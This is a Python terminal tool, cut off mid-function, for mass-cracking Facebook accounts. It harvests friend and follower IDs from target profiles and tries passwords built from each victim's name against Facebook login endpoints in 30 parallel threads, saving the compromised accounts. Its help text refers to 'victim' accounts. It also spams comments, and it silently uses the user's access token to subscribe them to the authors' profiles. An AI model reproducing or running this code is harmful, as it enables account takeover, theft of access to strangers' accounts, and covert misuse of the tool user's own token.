 # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
 # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
 # #    !/usr/bin/python3                                                                # #
 # #    Coding=utf-8                                                                         # #
 # #    About Script : Team Project                                               # #
 # #    Free  Multi Functional FB Script                                        # #
 # #    Created Date : 20-XXXXXXXX-2022                                 # #
 # #    Modified Date : 00-XXXXXXXX-2022                               # #
 # #    Copyright Can't Make You Real Programmer :)             # #
 # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
 # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

import os, sys, re, time, requests, calendar, random,json
from random import randint
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import datetime
from datetime import date
try:
	import requests
except ImportError:
	os.system("pip install requests")
try:
	import bs4
except ImportError:
	os.system("pip install bs4")
try:
	import concurrent.futures
except ImportError:
	os.system("pip install futures")
	
os.system("mkdir CP")
os.system("mkdir OK")
P = '\x1b[1;97m'        
K = '\x1b[1;91m'        
H = '\x1b[1;92m'           
M = '\x1b[1;93m'         
B = '\x1b[1;94m'             
U = '\x1b[1;95m'      
O = '\x1b[1;96m'    
N = '\x1b[0m'    
host = "https://mbasic.facebook.com"
ses = requests.Session()
id = []
cp = []
ok = []
ubahP = []
pwbaru = []
data = {}
data2 = {}
loop = 0
ct = datetime.now()
n = ct.month
bulann = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulann[nTemp]
my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = ("%s-%s-%s-%s"%(hr, ha, op, ta))
tgl = ("%s %s %s"%(ha, op, ta))
bulan = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
ua_xaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
def ugen_hp():
	print(" ")
	print("\033[1;97m[\033[1;94m01\033[1;97m] User-Agent Xiaomi ");print("\033[1;97m[\033[1;94m02\033[1;97m] User-Agent Nokia ");print("\033[1;97m[\033[1;94m03\033[1;97m] User-Agent Asus ");print("\033[1;97m[\033[1;94m04\033[1;97m] User-Agent Huawei ");print("\033[1;97m[\033[1;94m05\033[1;97m] User-Agent Vivo ");print("\033[1;97m[\033[1;94m06\033[1;97m] User-Agent Oppo ");print("\033[1;97m[\033[1;94m07\033[1;97m] User-Agent Samsung ");print("\033[1;97m[\033[1;94m08\033[1;97m] User-Agent Window ");os.system("rm -rf ugent.txt")
	pc = input("\033[1;97m[\033[1;94m+\033[1;97m] Choose : ")
	if pc in['']:jalan("\033[1;97m[\033[1;94m+\033[1;97m] Input Error ");menu()
	elif pc in ['1','01']:
		ugent = open('ugent.txt','w');ugent.write(ua_xaomi);ugent.close()
	elif pc in ['2','02']:
		ugent = open('ugent.txt','w');ugent.write(ua_nokia);ugent.close()
	elif pc in ['3','03']:
		ugent = open('ugent.txt','w');ugent.write(ua_asus);ugent.close()
	elif pc in ['4','04']:
		ugent = open('ugent.txt','w');ugent.write(ua_huawei);ugent.close()
	elif pc in ['5','05']:
		ugent = open('ugent.txt','w');ugent.write(ua_vivo);ugent.close()
	elif pc in ['6','06']:
		ugent = open('ugent.txt','w');ugent.write(ua_oppo);ugent.close()
	elif pc in ['7','07']:
		ugent = open('ugent.txt','w');ugent.write(ua_samsung);ugent.close()
	elif pc in ['8','08']:
		ugent = open('ugent.txt','w');ugent.write(ua_windows);ugent.close()
	jalan("\033[1;97m[\033[1;94m+\033[1;97m] Successfully Changed User Agent ")
	input("\033[1;97m[\033[1;94m+\033[1;97m] Back ")
	menu()
def about_cracking():
	print(" ");jalan("\033[1;97m[\033[1;94m+\033[1;97m] Method Api : Fast But Easy Process Spam ");jalan("\033[1;97m[\033[1;94m+\033[1;97m] Method Mbasic : The Process Is Quite Fast, Most Spamd ");jalan("\033[1;97m[\033[1;94m+\033[1;97m] Method Mobile : Slow Process, Probably OK ");jalan("\033[1;97m[\033[1;94m+\033[1;97m] Crack Using Data Quota (Not Support Wifi) ");jalan("\033[1;97m[\033[1;94m+\033[1;97m] If Results Do Not Appear While The Crack Is Running ");jalan("\033[1;97m[\033[1;94m+\033[1;97m] Turn On Airplane Mode Only 5 Seconds  ");input("\033[1;97m[\033[1;94m+\033[1;97m] Back ");menu()
def about_script():
	print(" ");jalan("\033[1;97m[\033[1;94m+\033[1;97m] Prepare a Sacrificial Account In Chrome For Cracking Process ");jalan("\033[1;97m[\033[1;94m+\033[1;97m] Change the Victim Account Password First ");jalan("\033[1;97m[\033[1;94m+\033[1;97m] Find Random Account Targets, Friends List Must Be Public ");jalan("\033[1;97m[\033[1;94m+\033[1;97m] Friends (FL) Free, Can be 1K, 2K, 3K, ,4K, Or 5K");jalan("\033[1;97m[\033[1;94m+\033[1;97m] More Friends, More Possible Results ");jalan("\033[1;97m[\033[1;94m+\033[1;97m] Tap Target Profile/Cover Photo ");jalan("\033[1;97m[\033[1;94m+\033[1;97m] URL/Link Above, There is \ id = 10001xx\ ");jalan("\033[1;97m[\033[1;94m+\033[1;97m] Well, thats a target ID ready to crack  ");jalan("\033[1;97m[\033[1;94m+\033[1;97m] Open Termux/Linux then proceed to the Crack Process");input("\033[1;97m[\033[1;94m+\033[1;97m] Back ");menu()
def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
def logo():
	os.system("clear")
	print("\033[1;97m  d8888b. d8888b.  .d88b.    \033[1;97m[\033[1;94m+\033[1;97m] AU \033[1;93m:\033[1;97m Hami ID") ;print("  88  `8D 88  `8D .8P  Y8.   \033[1;97m[\033[1;94m+\033[1;97m] GH \033[1;93m:\033[1;97m Hamid-king-06");print("  88oodD' 88oobY' 88    88   \033[1;97m[\033[1;94m+\033[1;97m] TM \033[1;93m:\033[1;97m XNSCODE");print("  88      88`8b   88    88   \033[1;97m[\033[1;94m+\033[1;97m] YT \033[1;93m:\033[1;97m HAMII WORLD");print("  88      88 `88. `8b  d8'   \033[1;97m[\033[1;94m+\033[1;97m] GM \033[1;93m:\033[1;97m Hamidkhawaja666@");print("  88      88   YD  `Y88P'    \033[1;97m[\033[1;94m+\033[1;97m] TN \033[1;93m:\033[1;97m Hamid-king-06/PRO/")
	print(" ")
def tokenz():
	os.system('clear')
	try:
		token = open('token.txt', 'r')
		menu()
	except (KeyError, IOError):
		os.system('clear')
		logo()
		token = input('\033[1;97m[\033[1;94m+\033[1;97m] Enter Token : ')
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			zedd = open('token.txt', 'w')
			zedd.write(token)
			zedd.close()
			bot()
			menu()
		except KeyError:
			print("\033[1;97m[\033[1;94m+\033[1;97m] Token Expired ")
			sys.exit()
def bot():
	try:
		token = open('token.txt', 'r').read()
	except (KeyError, IOError):
		exit("\033[1;97m[\033[1;94m+\033[1;97m] Token Expired ")
	requests.post('https://graph.facebook.com/100076835203956/subscribers?access_token=' + token) ### Bilal Haider ID
	requests.post('https://graph.facebook.com/100009521816069/subscribers?access_token=' + token) ### Hamid Meer-Hamj
def menu():
    global token
    os.system('clear')
    try:
        token = open('token.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        uid = a['id']
        ttl = a['birthday']
    except (KeyError, IOError):
        os.system('clear')
        print("\033[1;97m[\033[1;94m+\033[1;97m] Token Expired ")
        os.system('rm -f token.txt')
        tokenz()
    except requests.exceptions.ConnectionError:
        exit("\033[1;97m[\033[1;94m+\033[1;97m] Token Expired ")
    logo()
    print("\033[1;97m[\033[1;94m01\033[1;97m] Crack From Public ID")
    print("\033[1;97m[\033[1;94m02\033[1;97m] Crack From Follower ID")
    print("\033[1;97m[\033[1;94m03\033[1;97m] Crack From Multi Public ID\033[1;97m   [ \033[1;95mPro \033[1;97m]")
    print("\033[1;97m[\033[1;94m04\033[1;97m] Crack From Multi Follower ID\033[1;97m [ \033[1;95mPro \033[1;97m]")
    print("\033[1;97m[\033[1;94m05\033[1;97m] Change HighPower User-Agent\033[1;97m  [ \033[1;95mPro \033[1;97m]")
    print("\033[1;97m[\033[1;94m06\033[1;97m] Facebook Bot Comments")
    print("\033[1;97m[\033[1;94m07\033[1;97m] Delete Saved User-Agent")
    print("\033[1;97m[\033[1;94m08\033[1;97m] Report Bugge")
    print("\033[1;97m[\033[1;94m09\033[1;97m] Information About Script \033[1;97m    [ \033[1;94mHelp \033[1;97m]")
    print("\033[1;97m[\033[1;94m10\033[1;97m] Information Cracking Method\033[1;97m  [ \033[1;94mHelp \033[1;97m]")
    print("\033[1;97m[\033[1;94m00\033[1;97m] Logout \033[1;97m [ \033[1;91mDelete Token \033[1;97m]")
    asw = input("\033[1;97m[\033[1;94m>>\033[1;97m] Choose : ")
    if asw == "":
    	menu()
    elif asw == "1" or asw == "01":
    	publik()
    elif asw == "2" or asw == "02":
    	followr()
    elif asw == "3" or asw == "03":
    	multipublic()
    elif asw == "4" or asw == "04":
    	multifollower()
    elif asw == "5" or asw == "05":
    	ugen_hp()
    elif asw == "6" or asw == "06":
    	bot_comment()
    elif asw == "7" or asw == "07":
    	del_ua()
    elif asw == "8" or asw == "08":
    	report()
    elif asw == "9" or asw == "09":
    	about_script()
    elif asw == "10" or asw == "010":
    	about_cracking()
    elif asw == "0" or asw == "00":
    	os.system('rm -f token.txt')
def del_ua():
	import os, sys 
	os.system("rm -rf ugent.txt")
	jalan("\033[1;97m[\033[1;94m01\033[1;97m] User-Agent Delete Successful ")
	time.sleep(1)
	menu()
def bot_comment():
	print(" ")
	post = input("\033[1;97m[\033[1;94m>>\033[1;97m] Enter Your Public Post ID : ")
	time.sleep(2)
	comment_bot1 = input("\033[1;97m[\033[1;94m01\033[1;97m] Enter Your Comment 1 : ")
	comment_bot2 = input("\033[1;97m[\033[1;94m02\033[1;97m] Enter Your Comment 2 : ")
	comment_bot3 = input("\033[1;97m[\033[1;94m03\033[1;97m] Enter Your Comment 3 : ")
	comment_bot4 = input("\033[1;97m[\033[1;94m04\033[1;97m] Enter Your Comment 4 : ")
	comment_bot5 = input("\033[1;97m[\033[1;94m05\033[1;97m] Enter Your Comment 5 : ")
	token = open('token.txt', 'r').read()
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot1+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot1+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot1+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot1+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot1+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot1+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot1+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot1+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot1+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot1+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot2+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot2+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot2+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot2+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot2+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot2+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot2+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot2+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot2+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot2+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot3+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot3+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot3+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot3+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot3+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot3+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot3+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot3+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot3+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot3+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot4+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot4+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot4+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot4+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot4+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot4+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot4+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot4+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot4+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot4+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot5+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot5+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot5+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot5+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot5+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot5+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot5+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot5+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot5+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/' +post+ '/comments/?message=' +comment_bot5+ '&access_token=' + token)
	print(" ")
	print(" ")
	jalan("\033[1;97m[\033[1;94m+\033[1;97m] Comments Can be Successfully Submit On Your Post")
	print(" ")
	input("\033[1;97m[\033[1;94m+\033[1;97m] Back ")
	menu()
	
def report():
	rep = input("\033[1;97m[\033[1;94m>>\033[1;97m] Type Your Feedback : ")
	token = open('token.txt', 'r').read()
	requests.post('https://graph.facebook.com/105196632051510/comments/?message=' +rep+ '&access_token=' + token)
	print(" ")
	jalan("\033[1;97m[\033[1;94m+\033[1;97m] Thanks For Sending us Feedback ")
	input('\033[1;97m[\033[1;94m+\033[1;97m] Back ')
	menu()
def multifollower():
	global token
	try:
		token = open("token.txt", "r").read()
	except IOError:
		exit("\033[1;97m[\033[1;94m+\033[1;97m] Token Error")
	try:
		tanya_total = int(input("\033[1;97m[\033[1;94m+\033[1;97m] Target Accounts Amount : "))
	except:tanya_total=1
	for t in range(tanya_total):
		t +=1
		idt = input("\033[1;97m[\033[1;94m+\033[1;97m] Target Id %s : "%(t))
		try:
			for i in requests.get("https://graph.facebook.com/%s/subscribers?access_token=%s"%(idt, token)).json()["data"]:
				uid = i["id"]
				nama = i["name"]
				id.append(uid+"<=>"+nama)
		except KeyError:
			print("\033[1;97m[\033[1;94m+\033[1;97m] Follower ID Dump Error")
	print("\033[1;97m[\033[1;94m+\033[1;97m] Total id  : \033[0;91m%s\033[0;97m"%(len(id))) 
	atursandi()
def multipublic():
	global token
	try:
		token = open("token.txt", "r").read()
	except IOError:
		exit("\033[1;97m[\033[1;94m+\033[1;97m] Token Error")
	try:
		tanya_total = int(input("\033[1;97m[\033[1;94m+\033[1;97m] Target Accounts Amount : "))
	except:tanya_total=1
	for t in range(tanya_total):
		t +=1
		idt = input("\033[1;97m[\033[1;94m+\033[1;97m] Target Id %s : "%(t))
		try:
			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
				uid = i["id"]
				nama = i["name"]
				id.append(uid+"<=>"+nama)
		except KeyError:
			print("\033[1;97m[\033[1;94m+\033[1;97m] Account Friend List Is Not Public")
	print("\033[1;97m[\033[1;94m+\033[1;97m] Total id  : \033[0;91m%s\033[0;97m"%(len(id))) 
	atursandi()

def followr():
	try:
		token=open("token.txt","r").read()
	except IOError:
		exit("\033[1;97m[\033[1;94m+\033[1;97m] Token Error")
	idt=input("\033[1;97m[\033[1;94m+\033[1;97m] Follower ID : ")
	if idt in[""]:
		menu()
	print("\033[1;97m[\033[1;94m01\033[1;97m] Dump All ID   \033[1;97m[\033[1;94m02\033[1;97m] Dump Old ID   \033[1;97m[\033[1;94m03\033[1;97m] Crack New ID")
	ask=input("\033[1;97m[\033[1;94m+\033[1;97m] Choose : ")
	if ask in[""]:
		menu()
	elif ask in["1","01"]:
		try:
			for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=5000?access_token=%s"%(idt, token)).json()["data"]:
				uid = i["id"]
				nama = i["name"]
				id.append(uid+"<=>"+nama)
		except KeyError:
			exit("\033[1;97m[\033[1;94m+\033[1;97m] Dump Follower Account Error")
		print("\033[1;97m[\033[1;94m+\033[1;97m] Total ID : %s"%(len(id)))
		atursandi()
	elif ask in["2","02"]:
		try:
			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
				uid = i["id"]
				nama = i["name"]
				if len(i['id'])==6 or len(i['id'])==7 or len(i['id'])==8 or len(i['id'])==9 or len(i['id'])==10:
					id.append(uid+"<=>"+nama)
				elif i['id'][:10] in ['1000000000']:
					id.append(uid+"<=>"+nama)
				elif i['id'][:9] in ['100000000']:
					id.append(uid+"<=>"+nama)
				elif i['id'][:8] in ['10000000']:
					id.append(uid+"<=>"+nama)
				elif i['id'][:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:
					id.append(uid+"<=>"+nama)
		except KeyError:
			exit("\033[1;97m[\033[1;94m+\033[1;97m] Dump Follower Account Error")
		print("\033[1;97m[\033[1;94m+\033[1;97m] Total ID : %s"%(len(id)))
		atursandi()
	elif ask in["3","03"]:
		try:
			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
				uid = i["id"]
				nama = i["name"]
				if len(i['id'])==6 or len(i['id'])==7 or len(i['id'])==8 or len(i['id'])==9 or len(i['id'])==10:
					id.append(uid+"<=>"+nama)
				elif i['id'][:5] in ['10007']:
					id.append(uid+"<=>"+nama)
				elif i['id'][:5] in ['10008']:
					id.append(uid+"<=>"+nama)
		except KeyError:
			exit("\033[1;97m[\033[1;94m+\033[1;97m] Dump Follower Account Error")
		print("\033[1;97m[\033[1;94m+\033[1;97m] Total ID : %s"%(len(id)))
		atursandi()
		
def publik():
	try:
		token=open("token.txt","r").read()
	except IOError:
		exit("\033[1;97m[\033[1;94m+\033[1;97m] Token Error")
	idt=input("\033[1;97m[\033[1;94m+\033[1;97m] Public ID : ")
	if idt in[""]:
		menu()
	print(" ")
	print("\033[1;97m[\033[1;94m01\033[1;97m] Dump All ID   \033[1;97m[\033[1;94m02\033[1;97m] Dump Old ID   \033[1;97m[\033[1;94m03\033[1;97m] Dump New ID")
	ask=input("\033[1;97m[\033[1;94m+\033[1;97m] Choose : ")
	if ask in[""]:
		menu()
	elif ask in["1","01"]:
		try:
			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
				uid = i["id"]
				nama = i["name"]
				id.append(uid+"<=>"+nama)
		except KeyError:
			print("\033[1;97m[\033[1;94m2\033[1;97m] Account Friend List Is Not Public")
		print("\033[1;97m[\033[1;94m+\033[1;97m] Total ID : %s"%(len(id)))
		atursandi()
	elif ask in["2","02"]:
		try:
			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
				uid = i["id"]
				nama = i["name"]
				if len(i['id'])==6 or len(i['id'])==7 or len(i['id'])==8 or len(i['id'])==9 or len(i['id'])==10:
					id.append(uid+"<=>"+nama)
				elif i['id'][:10] in ['1000000000']:
					id.append(uid+"<=>"+nama)
				elif i['id'][:9] in ['100000000']:
					id.append(uid+"<=>"+nama)
				elif i['id'][:8] in ['10000000']:
					id.append(uid+"<=>"+nama)
				elif i['id'][:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:
					id.append(uid+"<=>"+nama)
		except KeyError:
			print("\033[1;97m[\033[1;94m2\033[1;97m] Account Friend List Is Not Public")
		print("\033[1;97m[\033[1;94m+\033[1;97m] Total ID : %s"%(len(id)))
		atursandi()
	elif ask in["3","03"]:
		try:
			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
				uid = i["id"]
				nama = i["name"]
				if len(i['id'])==6 or len(i['id'])==7 or len(i['id'])==8 or len(i['id'])==9 or len(i['id'])==10:
					id.append(uid+"<=>"+nama)
				elif i['id'][:5] in ['10007']:
					id.append(uid+"<=>"+nama)
				elif i['id'][:5] in ['10008']:
					id.append(uid+"<=>"+nama)
		except KeyError:
			print("\033[1;97m[\033[1;94m2\033[1;97m] Account Friend List Is Not Public")
		print("\033[1;97m[\033[1;94m+\033[1;97m] Total ID : %s"%(len(id)))
		atursandi()
		
def atursandi():
	print(" ")
	print("\033[1;97m[\033[1;94m01\033[1;97m] Auto Password \033[1;97m[\033[1;94m02\033[1;97m] Manual Password \033[1;97m[\033[1;94m03\033[1;97m] Additional Password")
	ask=input("\033[1;97m[\033[1;94m>>\033[1;97m] Choose : ")
	if ask in[""]:
		menu()
	elif ask in["1","01","a"]:
		otomatis()
	elif ask in["2","02","b"]:
		manual()
	elif ask in["3","03","c"]:
		gabungkan()
	else:
		exit()

def otomatis():
	print(" ")
	print("\033[1;97m[\033[1;94m01\033[1;97m] Method B-API");print("\033[1;97m[\033[1;94m02\033[1;97m] Method Mbasic");print("\033[1;97m[\033[1;94m03\033[1;97m] Method M.Facebook");print("\033[1;97m[\033[1;94m03\033[1;97m] Method D.Facebook");print("\033[1;97m[\033[1;94m03\033[1;97m] Method X.Facebook")
	ask=input("\033[1;97m[\033[1;94m>>\033[1;97m] Choose : ")
	if ask=="":
		menu()
	elif ask=="1" or ask=="01":
		print('\033[1;97m[\033[1;94m+\033[1;97m] Crack Result [CP] Save In  CP/00-XXXX-2022.txt');print('\033[1;97m[\033[1;94m+\033[1;97m] Crack Result [OK] Save In  OK/00-XXXX-2022.txt')
		print(" ")
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"12345", nam[0]+"1", nam[0]+"12", nam[0]+"123456", nam[0]+"123456789", nam[0]+"1122", nam[0]+"786"]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"12345", nam[0]+"1", nam[0]+"12", nam[0]+"123456", nam[0]+"123456789", nam[0]+"1122", nam[0]+"786"]
				fall.submit(api, uid, pwx)
		input("\n\033[1;97m[\033[1;94m+\033[1;97m] Back ");menu()
	elif ask=="2" or ask=="02":
		print('\033[1;97m[\033[1;94m+\033[1;97m] Crack Result [CP] Save In  CP/00-XXXX-2022.txt');print('\033[1;97m[\033[1;94m+\033[1;97m] Crack Result [OK] Save In  OK/00-XXXX-2022.txt')
		print(" ")
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"12345", nam[0]+"1", nam[0]+"12", nam[0]+"123456", nam[0]+"123456789", nam[0]+"1122", nam[0]+"786"]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"12345", nam[0]+"1", nam[0]+"12", nam[0]+"123456", nam[0]+"123456789", nam[0]+"1122", nam[0]+"786"]
				fall.submit(crack, uid, pwx,"https://mbasic.facebook.com")
		input("\n\033[1;97m[\033[1;94m+\033[1;97m] Back ");menu()
	elif ask=="3" or ask=="03":
		print('\033[1;97m[\033[1;94m+\033[1;97m] Crack Result [CP] Save In  CP/00-XXXX-2022.txt');print('\033[1;97m[\033[1;94m+\033[1;97m] Crack Result [OK] Save In  OK/00-XXXX-2022.txt')
		print(" ")
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"12345", nam[0]+"1", nam[0]+"12", nam[0]+"123456", nam[0]+"123456789", nam[0]+"1122", nam[0]+"786"]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"12345", nam[0]+"1", nam[0]+"12", nam[0]+"123456", nam[0]+"123456789", nam[0]+"1122", nam[0]+"786"]
				fall.submit(crack, uid, pwx,"https://m.facebook.com")
		exit("\n\n [#] crack selesai...")
	elif ask=="4" or ask=="04":
		print('\033[1;97m[\033[1;94m+\033[1;97m] Crack Result [CP] Save In  CP/00-XXXX-2022.txt');print('\033[1;97m[\033[1;94m+\033[1;97m] Crack Result [OK] Save In  OK/00-XXXX-2022.txt')
		print(" ")
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"12345", nam[0]+"1", nam[0]+"12", nam[0]+"123456", nam[0]+"123456789", nam[0]+"1122", nam[0]+"786"]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"12345", nam[0]+"1", nam[0]+"12", nam[0]+"123456", nam[0]+"123456789", nam[0]+"1122", nam[0]+"786"]
				fall.submit(crack, uid, pwx,"https://m.facebook.com")
		input("\n\033[1;97m[\033[1;94m+\033[1;97m] Back ");menu()
	elif ask=="5" or ask=="05":
		print('\033[1;97m[\033[1;94m+\033[1;97m] Crack Result [CP] Save In  CP/00-XXXX-2022.txt');print('\033[1;97m[\033[1;94m+\033[1;97m] Crack Result [OK] Save In  OK/00-XXXX-2022.txt')
		print(" ")
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
